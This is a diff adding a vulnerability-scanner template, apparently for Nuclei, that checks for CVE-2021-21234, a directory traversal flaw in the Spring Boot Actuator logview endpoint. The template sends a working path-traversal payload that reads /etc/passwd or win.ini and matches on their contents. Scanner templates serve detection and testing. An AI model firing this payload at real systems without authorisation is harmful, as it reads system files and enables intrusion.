@@ -1,0 +1,30 @@
+id: spring-boot-logview-file-read
+info:
+  name: Spring Boot Actuator Logview Directory Traversal (CVE-2021-21234)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read,cve,cve-2021-21234
+
+variables:
+  paths:
+    - "/"
+    - "/manage/"
+  payloads:
+    - "/etc/passwd"
+    - "/windows/win.ini"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}{{paths}}log/view?filename={{payloads}}&base=../../../../../../../../../../"
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "bit app support"
+          - "fonts"
+          - "extensions"
+        condition: and
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
